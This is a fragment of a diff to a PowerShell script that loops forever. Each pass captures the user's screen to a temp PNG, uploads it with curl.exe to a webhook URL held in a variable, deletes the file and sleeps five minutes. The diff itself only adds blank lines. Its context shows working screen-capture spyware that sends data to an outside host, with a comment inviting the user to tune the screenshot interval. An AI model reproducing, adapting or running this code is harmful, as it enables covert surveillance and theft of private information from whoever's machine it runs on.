@@ -3,6 +3,7 @@ While ($true){
 
 $hookurl = "$dc"
 
+
 $Filett = "$env:temp\SC.png"
 Add-Type -AssemblyName System.Windows.Forms
 Add-type -AssemblyName System.Drawing
@@ -19,6 +20,7 @@ Start-Sleep 1
 curl.exe -F "file1=@$filett" $hookurl
 Start-Sleep 1
 Remove-Item -Path $filett
+
 
 Start-Sleep 300 # Change to whatever interval you would like beetween screenshots
 }
